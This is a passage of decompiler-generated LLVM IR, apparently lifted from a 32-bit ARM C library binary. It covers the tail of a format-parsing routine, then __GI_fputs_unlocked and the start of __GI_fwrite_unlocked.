  %v0_153c8 = phi i32 [ %v1_153c8, %dec_label_pc_153c8 ], [ ptrtoint (i32* @global_var_246d7.1368 to i32), %bb144 ]
  %v1_153c8 = add i32 %v0_153c8, 1
  %v2_153c8 = inttoptr i32 %v1_153c8 to i8*
  %v3_153c8 = load i8, i8* %v2_153c8, align 1
  %v4_153c8 = zext i8 %v3_153c8 to i32
  store i32 %v4_153c8, i32* %r3.global-to-local, align 4
  store i32 %v1_153c8, i32* %r1.global-to-local, align 4
  %v8_153d0 = icmp sgt i32 %v0_153cc.pre, %v4_153c8
  br i1 %v8_153d0, label %dec_label_pc_153c8, label %dec_label_pc_153d4

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153c8
  %v2_153d8 = sub i32 %v1_153c8, ptrtoint (i32* @global_var_246d8.1370 to i32)
  store i32 ptrtoint (i32* @global_var_246c8.1372 to i32), i32* %r1.global-to-local, align 4
  %v2_153e0 = mul i32 %v2_153d8, 2
  store i32 %v2_153e0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_246b8.1374 to i32), i32* %r0.global-to-local, align 4
  %v2_153e8 = add i32 %v2_153e0, ptrtoint (i32* @global_var_246c8.1372 to i32)
  store i32 %v2_153e8, i32* %r2.global-to-local, align 4
  %v3_153ec = inttoptr i32 %v2_153e8 to i8*
  %v4_153ec = load i8, i8* %v3_153ec, align 2
  %v6_153ec = zext i8 %v4_153ec to i32
  %v1_153f0 = add i32 %v2_153e0, add (i32 ptrtoint (i32* @global_var_246c8.1372 to i32), i32 1)
  %v2_153f0 = inttoptr i32 %v1_153f0 to i8*
  %v3_153f0 = load i8, i8* %v2_153f0, align 1
  %v4_153f0 = zext i8 %v3_153f0 to i32
  store i32 %v4_153f0, i32* %r2.global-to-local, align 4
  %v2_153f4 = add i32 %v2_153e0, ptrtoint (i32* @global_var_246b8.1374 to i32)
  store i32 %v2_153f4, i32* %r1.global-to-local, align 4
  %v3_153f8 = inttoptr i32 %v2_153f4 to i8*
  %v4_153f8 = load i8, i8* %v3_153f8, align 2
  %v6_153f8 = zext i8 %v4_153f8 to i32
  store i32 %v6_153f8, i32* %r0.global-to-local, align 4
  %v1_153fc = add i32 %v2_153e0, add (i32 ptrtoint (i32* @global_var_246b8.1374 to i32), i32 1)
  %v2_153fc = inttoptr i32 %v1_153fc to i8*
  %v3_153fc = load i8, i8* %v2_153fc, align 1
  %v4_153fc = zext i8 %v3_153fc to i32
  %v4_15400 = mul nuw nsw i32 %v6_153ec, 256
  %v5_15400 = or i32 %v4_153f0, %v4_15400
  %v4_15404 = mul nuw nsw i32 %v6_153f8, 256
  %v5_15404 = or i32 %v4_153fc, %v4_15404
  %v3_15408 = mul i32 %v5_15400, 65536
  %v0_1540c = load i32, i32* @lr, align 4
  %v4_1540c = sdiv i32 %v3_15408, 65536
  %v5_1540c = or i32 %v0_1540c, %v4_1540c
  %v3_15410 = mul i32 %v5_15404, 65536
  store i32 %v3_15410, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_24708.1366 to i32), i32* %r0.global-to-local, align 4
  %v4_15418 = sdiv i32 %v3_15410, 65536
  %v5_15418 = and i32 %v4_15418, %v5_1540c
  store i32 %v5_15418, i32* %r2.global-to-local, align 4
  store i32 %v5_15418, i32* %stack_var_-68, align 4
  %v0_1543c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15430

dec_label_pc_15424:                               ; preds = %dec_label_pc_1539c
  %v1_15424 = add i32 %v1_153ac, 1
  %v2_15424 = inttoptr i32 %v1_15424 to i8*
  %v3_15424 = load i8, i8* %v2_15424, align 1
  %v4_15424 = zext i8 %v3_15424 to i32
  store i32 %v4_15424, i32* %r3.global-to-local, align 4
  store i32 %v1_15424, i32* %r0.global-to-local, align 4
  %v2_15428 = icmp eq i8 %v3_15424, 0
  br i1 %v2_15428, label %dec_label_pc_15430, label %dec_label_pc_1539c

dec_label_pc_15430:                               ; preds = %dec_label_pc_15424, %dec_label_pc_153d4
  %v0_1543c = phi i32 [ %v0_1543c.pre, %dec_label_pc_153d4 ], [ %v0_15384, %dec_label_pc_15424 ]
  %v0_15438 = phi i32 [ %v0_1540c, %dec_label_pc_153d4 ], [ %v3_15390, %dec_label_pc_15424 ]
  %v0_15430 = load i32, i32* @r4, align 4
  %v1_15430 = and i32 %v0_15430, 4
  %v1_15434 = and i32 %v0_15430, -5
  store i32 %v1_15434, i32* %r3.global-to-local, align 4
  %v1_15438 = and i32 %v0_15438, 3840
  store i32 %v1_15438, i32* %r2.global-to-local, align 4
  %v1_1543c = inttoptr i32 %v0_1543c to i8*
  %v2_1543c = load i8, i8* %v1_1543c, align 1
  %v3_1543c = zext i8 %v2_1543c to i32
  store i32 %v3_1543c, i32* %r1.global-to-local, align 4
  %v2_15440 = or i32 %v1_15434, %v1_15438
  store i32 %v2_15440, i32* %r2.global-to-local, align 4
  %tmp169 = mul nuw nsw i32 %v1_15430, 4
  %tmp170 = or i32 %tmp169, 32
  %v1_1544c = load i32, i32* %r7.global-to-local, align 4
  %v2_1544c = add i32 %v1_1544c, 20
  %v3_1544c = inttoptr i32 %v2_1544c to i32*
  store i32 %tmp170, i32* %v3_1544c, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_15454 = load i32, i32* %r1.global-to-local, align 4
  %v1_15454 = load i32, i32* %r7.global-to-local, align 4
  %v2_15454 = add i32 %v1_15454, 12
  %v3_15454 = inttoptr i32 %v2_15454 to i32*
  store i32 %v0_15454, i32* %v3_15454, align 4
  %v0_15458 = load i32, i32* %r7.global-to-local, align 4
  %v1_15458 = add i32 %v0_15458, 4
  %v2_15458 = inttoptr i32 %v1_15458 to i32*
  %v3_15458 = load i32, i32* @r5, align 4
  store i32 %v3_15458, i32* %v2_15458, align 4
  %v4_15458 = add i32 %v0_15458, 8
  %v5_15458 = inttoptr i32 %v4_15458 to i32*
  %v6_15458 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_15458, i32* %v5_15458, align 4
  %v0_1545c = load i32, i32* %r2.global-to-local, align 4
  %v1_1545c = load i32, i32* %r7.global-to-local, align 4
  %v2_1545c = add i32 %v1_1545c, 16
  %v3_1545c = inttoptr i32 %v2_1545c to i32*
  store i32 %v0_1545c, i32* %v3_1545c, align 4
  %v0_15460 = load i32, i32* %r3.global-to-local, align 4
  %v1_15460 = load i32, i32* %r7.global-to-local, align 4
  %v2_15460 = add i32 %v1_15460, 28
  %v3_15460 = inttoptr i32 %v2_15460 to i32*
  store i32 %v0_15460, i32* %v3_15460, align 4
  %v0_15464 = load i32, i32* %r0.global-to-local, align 4
  %v1_15464 = inttoptr i32 %v0_15464 to i8*
  %v2_15464 = load i8, i8* %v1_15464, align 1
  %v3_15464 = zext i8 %v2_15464 to i32
  store i32 %v3_15464, i32* %r2.global-to-local, align 4
  %v2_15468 = icmp eq i8 %v2_15464, 0
  br i1 %v2_15468, label %dec_label_pc_15470, label %dec_label_pc_154ec

dec_label_pc_15470:                               ; preds = %dec_label_pc_15430
  %v0_15470 = load i32, i32* %r6.global-to-local, align 4
  %v1_15470 = inttoptr i32 %v0_15470 to i8*
  %v2_15470 = load i8, i8* %v1_15470, align 1
  %v3_15470 = zext i8 %v2_15470 to i32
  store i32 %v3_15470, i32* %r3.global-to-local, align 4
  %v7_15474 = icmp eq i8 %v2_15470, 109
  br i1 %v7_15474, label %.thread27, label %dec_label_pc_15488

.thread27:                                        ; preds = %dec_label_pc_15470
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_1547c = load i32, i32* %r7.global-to-local, align 4
  %v3_1547c = add i32 %v2_1547c, 32
  %v4_1547c = inttoptr i32 %v3_1547c to i32*
  store i32 20, i32* %v4_1547c, align 4
  %v1_15480 = load i32, i32* %r2.global-to-local, align 4
  %v2_15480 = load i32, i32* %r7.global-to-local, align 4
  %v3_15480 = add i32 %v2_15480, 28
  %v4_15480 = inttoptr i32 %v3_15480 to i32*
  store i32 %v1_15480, i32* %v4_15480, align 4
  br label %dec_label_pc_154ec

dec_label_pc_15488:                               ; preds = %dec_label_pc_15470
  %v2_1548c = load i32, i32* bitcast (i32** @global_var_2e32c.1346 to i32*), align 4
  store i32 %v2_1548c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_15494 = load i32, i32* %r7.global-to-local, align 4
  %v2_15494 = add i32 %v1_15494, 32
  %v3_15494 = inttoptr i32 %v2_15494 to i32*
  store i32 21, i32* %v3_15494, align 4
  %v0_15498 = load i32, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e336.1347 to i32), i32* %r0.global-to-local, align 4
  %v1_154a0 = inttoptr i32 %v0_15498 to i8*
  %v2_154a0 = load i8, i8* %v1_154a0, align 1
  %v3_154a0 = zext i8 %v2_154a0 to i32
  store i32 %v3_154a0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_154b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_154b4 = add i32 %v0_154b4, 4
  store i32 %v1_154b4, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_154bc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_154bc, i32* %r2.global-to-local, align 4
  store i32 87244, i32* @lr, align 4
  %v7_154c8 = load i32, i32* @global_var_346c4.1377, align 4
  call void @__pseudo_branch(i32 %v7_154c8)
  %v0_154cc = load i32, i32* %r0.global-to-local, align 4
  %v1_154d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_154d0 = add i32 %v1_154d0, 28
  %v3_154d0 = inttoptr i32 %v2_154d0 to i32*
  store i32 %v0_154cc, i32* %v3_154d0, align 4
  %v7_154d4 = icmp sgt i32 %v0_154cc, 5
  br i1 %v7_154d4, label %dec_label_pc_155e8, label %dec_label_pc_154ec

dec_label_pc_154ec:                               ; preds = %.thread27, %dec_label_pc_15488, %dec_label_pc_15430
  %v0_154ec = load i32, i32* %fp.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_154ec, 1
  br i1 %tmp148, label %dec_label_pc_15598, label %dec_label_pc_154f4

dec_label_pc_154f4:                               ; preds = %dec_label_pc_154ec
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_1550c = add i32 %stack_var_-40.3, -2
  br label %dec_label_pc_154f8

dec_label_pc_154f8:                               ; preds = %dec_label_pc_15580, %dec_label_pc_154f4
  %v9_15518 = phi i32 [ 0, %dec_label_pc_154f4 ], [ %v1_15584, %dec_label_pc_15580 ]
  %v7_154fc = icmp sgt i32 %v9_15518, 2
  br i1 %v7_154fc, label %.thread37, label %bb149

.thread37:                                        ; preds = %dec_label_pc_154f8
  store i32 %v9_1550c, i32* %r3.global-to-local, align 4
  %v10_15518 = add i32 %v9_15518, %v9_1550c
  store i32 %v10_15518, i32* %r1.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_154f8
  %v12_15500 = mul i32 %v9_15518, 4
  %v13_15500 = add i32 %v12_15500, %v28_150dc
  store i32 %v13_15500, i32* %r3.global-to-local, align 4
  %v9_15508 = add i32 %v13_15500, -9
  %v10_15508 = inttoptr i32 %v9_15508 to i8*
  %v11_15508 = load i8, i8* %v10_15508, align 1
  %v12_15508 = zext i8 %v11_15508 to i32
  store i32 %v12_15508, i32* %r2.global-to-local, align 4
  %v9_15510 = load i32, i32* %r7.global-to-local, align 4
  %v10_15510 = add i32 %v9_15510, %v9_15518
  store i32 %v10_15510, i32* %r3.global-to-local, align 4
  store i32 %v12_15508, i32* %r1.global-to-local, align 4
  %v11_1551c = add i32 %v10_15510, 36
  %v12_1551c = inttoptr i32 %v11_1551c to i8*
  store i8 %v11_15508, i8* %v12_1551c, align 1
  %v0_15520.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread37, %bb149
  %v0_15540 = phi i32 [ %v10_15518, %.thread37 ], [ %v0_15520.pre, %bb149 ]
  %v1_15520 = load i32, i32* %fp.global-to-local, align 4
  %v2_15520 = sub i32 %v0_15540, %v1_15520
  %v4_15520 = xor i32 %v1_15520, %v0_15540
  %v5_15520 = xor i32 %v2_15520, %v0_15540
  %v6_15520 = and i32 %v5_15520, %v4_15520
  %v7_15520 = icmp slt i32 %v6_15520, 0
  %v8_15520 = icmp slt i32 %v2_15520, 0
  %v9_15520 = icmp eq i32 %v0_15540, %v1_15520
  %v3_15524 = xor i1 %v8_15520, %v7_15520
  %v4_15524 = or i1 %v9_15520, %v3_15524
  br i1 %v4_15524, label %dec_label_pc_15534, label %dec_label_pc_15528

dec_label_pc_15528:                               ; preds = %bb150
  %v1_15528 = add i32 %v0_15540, -9
  %v3_15528 = sub i32 8, %v0_15540
  %v4_15528 = and i32 %v3_15528, %v0_15540
  %v5_15528 = icmp slt i32 %v4_15528, 0
  %v6_15528 = icmp slt i32 %v1_15528, 0
  %v7_15528 = icmp eq i32 %v0_15540, 9
  %v3_1552c = xor i1 %v6_15528, %v5_15528
  %v4_1552c = or i1 %v7_15528, %v3_1552c
  br i1 %v4_1552c, label %dec_label_pc_15530, label %dec_label_pc_155e8

dec_label_pc_15530:                               ; preds = %dec_label_pc_15528
  store i32 %v0_15540, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15534

dec_label_pc_15534:                               ; preds = %bb150, %dec_label_pc_15530
  store i32 %v28_150dc, i32* @r2, align 4
  %v1_15538 = load i32, i32* %r8.global-to-local, align 4
  %v4_15538 = mul i32 %v1_15538, 4
  %v5_15538 = add i32 %v4_15538, %v28_150dc
  store i32 %v5_15538, i32* %sb.global-to-local, align 4
  %v1_1553c = add i32 %v5_15538, -40
  %v2_1553c = inttoptr i32 %v1_1553c to i32*
  %v3_1553c = load i32, i32* %v2_1553c, align 4
  store i32 %v3_1553c, i32* %r5.global-to-local, align 4
  %v1_15540 = add i32 %v0_15540, -1
  store i32 %v1_15540, i32* %r3.global-to-local, align 4
  %v0_15544 = load i32, i32* %r7.global-to-local, align 4
  %v4_15544 = mul i32 %v1_15540, 4
  %v5_15544 = add i32 %v0_15544, %v4_15544
  store i32 %v5_15544, i32* %sl.global-to-local, align 4
  %v7_15548 = icmp eq i32 %v3_1553c, 8
  %v1_1554c = add i32 %v5_15544, 40
  %v2_1554c = inttoptr i32 %v1_1554c to i32*
  %v3_1554c = load i32, i32* %v2_1554c, align 4
  store i32 %v3_1554c, i32* @r0, align 4
  br i1 %v7_15548, label %dec_label_pc_15580, label %dec_label_pc_15554

dec_label_pc_15554:                               ; preds = %dec_label_pc_15534
  %v9_15554 = icmp eq i32 %v3_1554c, %v3_1553c
  br i1 %v9_15554, label %dec_label_pc_15578, label %bb151

bb151:                                            ; preds = %dec_label_pc_15554
  %v8_15558 = icmp eq i32 %v3_1554c, 8
  br i1 %v8_15558, label %dec_label_pc_15578, label %dec_label_pc_15560

dec_label_pc_15560:                               ; preds = %bb151
  %v0_15560 = call i32 @_promoted_size()
  %v0_15568 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15568, i32* @r0, align 4
  %v0_1556c = call i32 @_promoted_size()
  store i32 %v0_1556c, i32* %r0.global-to-local, align 4
  %v8_15574 = icmp sgt i32 %v0_15560, %v0_1556c
  br i1 %v8_15574, label %dec_label_pc_15580, label %dec_label_pc_15560.dec_label_pc_15578_crit_edge

dec_label_pc_15560.dec_label_pc_15578_crit_edge:  ; preds = %dec_label_pc_15560
  %v0_15578.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_1557c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15578

dec_label_pc_15578:                               ; preds = %dec_label_pc_15560.dec_label_pc_15578_crit_edge, %dec_label_pc_15554, %bb151
  %v1_1557c = phi i32 [ %v1_1557c.pre, %dec_label_pc_15560.dec_label_pc_15578_crit_edge ], [ %v5_15544, %dec_label_pc_15554 ], [ %v5_15544, %bb151 ]
  %v0_15578 = phi i32 [ %v0_15578.pre, %dec_label_pc_15560.dec_label_pc_15578_crit_edge ], [ %v5_15538, %dec_label_pc_15554 ], [ %v5_15538, %bb151 ]
  %v1_15578 = add i32 %v0_15578, -40
  %v2_15578 = inttoptr i32 %v1_15578 to i32*
  %v3_15578 = load i32, i32* %v2_15578, align 4
  store i32 %v3_15578, i32* %r3.global-to-local, align 4
  %v2_1557c = add i32 %v1_1557c, 40
  %v3_1557c = inttoptr i32 %v2_1557c to i32*
  store i32 %v3_15578, i32* %v3_1557c, align 4
  br label %dec_label_pc_15580

dec_label_pc_15580:                               ; preds = %dec_label_pc_15560, %dec_label_pc_15534, %dec_label_pc_15578
  %v0_15580 = load i32, i32* %r7.global-to-local, align 4
  %v1_15580 = add i32 %v0_15580, 28
  %v2_15580 = inttoptr i32 %v1_15580 to i32*
  %v3_15580 = load i32, i32* %v2_15580, align 4
  %v0_15584 = load i32, i32* %r8.global-to-local, align 4
  %v1_15584 = add i32 %v0_15584, 1
  store i32 %v1_15584, i32* %r8.global-to-local, align 4
  %v1_15588 = add i32 %v3_15580, 2
  store i32 %v1_15588, i32* %r3.global-to-local, align 4
  %v6_15590 = icmp slt i32 %v1_15584, %v1_15588
  br i1 %v6_15590, label %dec_label_pc_154f8, label %dec_label_pc_155b4

dec_label_pc_15598:                               ; preds = %dec_label_pc_154ec
  %v0_15598 = load i32, i32* %r7.global-to-local, align 4
  %v1_15598 = add i32 %v0_15598, 28
  %v2_15598 = inttoptr i32 %v1_15598 to i32*
  %v3_15598 = load i32, i32* %v2_15598, align 4
  store i32 %v3_15598, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_155a0 = add i32 %v0_15598, 38
  %v4_155a0 = inttoptr i32 %v3_155a0 to i8*
  store i8 1, i8* %v4_155a0, align 1
  %v0_155a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_155a4 = mul i32 %v0_155a4, 4
  store i32 %v3_155a4, i32* @r2, align 4
  %v0_155a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_155a8 = add i32 %v0_155a8, 40
  store i32 %v1_155a8, i32* @r0, align 4
  %v2_155ac = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_155ac, i32* @r1, align 4
  %v0_155b0 = call i32 @memcpy()
  store i32 %v0_155b0, i32* %r0.global-to-local, align 4
  %v0_155b4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_155b4

dec_label_pc_155b4:                               ; preds = %dec_label_pc_15580, %dec_label_pc_15598
  %v2_155d0 = phi i32 [ %v0_155b4.pre, %dec_label_pc_15598 ], [ %v0_15580, %dec_label_pc_15580 ]
  %v1_155b4 = add i32 %v2_155d0, 16
  %v2_155b4 = inttoptr i32 %v1_155b4 to i32*
  %v3_155b4 = load i32, i32* %v2_155b4, align 4
  store i32 %v3_155b4, i32* %r3.global-to-local, align 4
  %v1_155b8 = and i32 %v3_155b4, 128
  %v2_155b8 = icmp eq i32 %v1_155b8, 0
  br i1 %v2_155b8, label %.thread49, label %.thread47

.thread47:                                        ; preds = %dec_label_pc_155b4
  store i32 %v2_150e4, i32* %r3.global-to-local, align 4
  %v2_155c0 = inttoptr i32 %v2_155d0 to i32*
  %v3_155c0 = load i32, i32* %v2_155c0, align 4
  %v2_155c8.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_155c8 = sub i32 %v2_155c8.pre, %v2_150e4
  store i32 %v3_155c8, i32* %r3.global-to-local, align 4
  %v5_155cc = mul i32 %v3_155c8, 4
  %v6_155cc = add i32 %v5_155cc, %v3_155c0
  store i32 %v6_155cc, i32* @r2, align 4
  br label %bb152

.thread49:                                        ; preds = %dec_label_pc_155b4
  %v1_155c444 = load i32, i32* %r6.global-to-local, align 4
  %v2_155c445 = add i32 %v1_155c444, 1
  store i32 %v2_155c445, i32* %r3.global-to-local, align 4
  %v3_155d0 = inttoptr i32 %v2_155d0 to i32*
  store i32 %v2_155c445, i32* %v3_155d0, align 4
  %v0_155d4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %.thread47, %.thread49
  %v1_155dc = phi i32 [ %v2_155d0, %.thread47 ], [ %v0_155d4.pre, %.thread49 ]
  %v1_155d4 = add i32 %v1_155dc, 28
  %v2_155d4 = inttoptr i32 %v1_155d4 to i32*
  %v3_155d4 = load i32, i32* %v2_155d4, align 4
  store i32 %v3_155d4, i32* %r3.global-to-local, align 4
  %v1_155d8 = add i32 %v3_155d4, 2
  store i32 %v1_155d8, i32* %r0.global-to-local, align 4
  %v0_155dc = load i32, i32* %fp.global-to-local, align 4
  %v2_155dc = add i32 %v1_155dc, 24
  %v3_155dc = inttoptr i32 %v2_155dc to i32*
  store i32 %v0_155dc, i32* %v3_155dc, align 4
  br i1 %v2_155b8, label %dec_label_pc_155ec, label %bb153

bb153:                                            ; preds = %bb152
  %v1_155e0 = load i32, i32* @r2, align 4
  %v2_155e0 = load i32, i32* %r7.global-to-local, align 4
  %v3_155e0 = inttoptr i32 %v2_155e0 to i32*
  store i32 %v1_155e0, i32* %v3_155e0, align 4
  br label %dec_label_pc_155ec

dec_label_pc_155e8:                               ; preds = %dec_label_pc_15118, %dec_label_pc_15254, %dec_label_pc_15300, %dec_label_pc_152d8, %dec_label_pc_152e4, %dec_label_pc_15220, %dec_label_pc_15528, %dec_label_pc_15488, %.thread23
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155ec

dec_label_pc_155ec:                               ; preds = %bb153, %bb152, %dec_label_pc_155e8
  %v2_155f0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_155f0, i32* @r4, align 4
  store i32 %v6_150dc, i32* @r5, align 4
  %v29_155f0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_155f0

; uselistorder directives
  uselistorder i32 %v3_155c8, { 1, 0 }
  uselistorder i32 %v1_15584, { 1, 2, 0 }
  uselistorder i32 %v2_15520, { 1, 0 }
  uselistorder i32 %v1_15520, { 1, 0, 2 }
  uselistorder i32 %v0_15540, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_15518, { 0, 2, 1, 3 }
  uselistorder i32 %v0_154cc, { 1, 0 }
  uselistorder i32 %v1_15424, { 1, 2, 0 }
  uselistorder i32 %v3_15410, { 1, 0 }
  uselistorder i32 %v0_1540c, { 1, 0 }
  uselistorder i32 %v2_153e0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_153c8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_153ac, { 1, 0, 2 }
  uselistorder i32 %v3_15390, { 2, 1, 0 }
  uselistorder i32 %v1_15354, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15344.pre, { 0, 2, 1 }
  uselistorder i32 %v2_15324, { 1, 0 }
  uselistorder i32 %v5_15284, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15284, { 1, 0 }
  uselistorder i32 %v0_1528872, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-40.2, { 1, 0 }
  uselistorder i32 %v2_1522c, { 1, 0 }
  uselistorder i32 %v0_1524c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_15210, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_151f8, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i8 %v2_151dc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15260, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %stack_var_-40.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1518c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15174, { 1, 0 }
  uselistorder i32 %v1_15138, { 0, 2, 1 }
  uselistorder i32 %v0_150e0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v28_150dc, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-68, { 1, 2, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 6, 5, 4, 7 }
  uselistorder i32* %r7.global-to-local, { 3, 1, 0, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20 }
  uselistorder i32* %r6.global-to-local, { 13, 8, 11, 9, 4, 5, 10, 6, 12, 7, 0, 14, 1, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 45, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 17, 40, 43, 44, 41, 42, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 21, 22, 20, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 22, 23, 21, 16, 24, 17, 18, 19, 25, 20, 26, 0, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 3, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 19, 20, 21, 17, 18, 2, 22, 23, 24, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32** @global_var_2e32c.1346, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_246b8.1374 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_24708.1366 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_246a4.1364 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder i32 214748364, { 0, 2, 1 }
  uselistorder label %dec_label_pc_155ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_155e8, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_155b4, { 1, 0 }
  uselistorder label %dec_label_pc_15580, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15578, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15534, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %dec_label_pc_154ec, { 1, 0, 2 }
  uselistorder label %bb144, { 2, 1, 0 }
  uselistorder label %.thread23, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15310, { 1, 0 }
  uselistorder label %dec_label_pc_152c4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_15240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1523c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_151d8, { 1, 0 }
  uselistorder label %dec_label_pc_151d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_151d8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15178, { 1, 0 }
  uselistorder label %dec_label_pc_1515c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15624 = load i32, i32* @r4, align 4
  store i32 %v3_15624, i32* %stack_var_-16, align 4
  %v6_15624 = load i32, i32* @r5, align 4
  %v9_15624 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_15630 = call i32 @strlen(i8* %arg1)
  store i32 %v3_15630, i32* @r6, align 4
  %v0_15638 = load i32, i32* @r5, align 4
  %v0_1563c = load i32, i32* @r4, align 4
  %v5_15648 = inttoptr i32 %v0_15638 to i8*
  %v6_15648 = call i32 @__GI_fwrite_unlocked(i32 %v0_1563c, i32 1, i32 %v3_15630, i8* %v5_15648)
  %v1_1564c = load i32, i32* @r6, align 4
  %v9_1564c = icmp eq i32 %v6_15648, %v1_1564c
  br i1 %v9_1564c, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_15654 = phi i32 [ %v6_15648, %entry ], [ -1, %bb ]
  %v2_15654 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15654, i32* @r4, align 4
  store i32 %v6_15624, i32* @r5, align 4
  store i32 %v9_15624, i32* @r6, align 4
  ret i32 %v14_15654

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_15658 = load i32, i32* @r6, align 4
  %v12_15658 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_15660 = add i32 %tmp, 1
  %v3_15660 = inttoptr i32 %v2_15660 to i8*
  %v4_15660 = load i8, i8* %v3_15660, align 1
  %v5_15660 = zext i8 %v4_15660 to i32
  %v1_15664 = and i32 %v5_15660, 192
  store i32 %v1_15664, i32* %r3.global-to-local, align 4
  %v2_15668 = icmp eq i32 %v1_15664, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r5, align 4
